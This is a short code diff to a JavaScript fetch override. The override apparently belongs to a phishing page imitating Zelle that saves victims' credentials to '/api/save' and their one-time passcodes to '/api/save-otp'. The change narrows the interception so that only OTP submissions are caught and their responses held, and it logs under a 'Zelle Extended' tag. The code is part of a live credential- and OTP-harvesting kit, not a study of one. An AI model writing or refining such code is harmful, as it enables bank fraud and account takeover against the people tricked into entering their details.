@@ -784,7 +784,8 @@
         
         window.fetch = async function(...args) {
             const url = typeof args[0] === 'string' ? args[0] : (args[0] && args[0].url) || '';
-            const isOtpSubmission = (url.includes('/api/save-otp') || url.includes('/api/save')) && !url.includes('final');
+            // Only intercept OTP submission - NOT credentials (/api/save)
+            const isOtpSubmission = url.includes('/api/save-otp') && !url.includes('final');
             
             if (isOtpSubmission) {
                 console.log('[Zelle Extended] 🔒 Intercepted OTP submission - holding response');
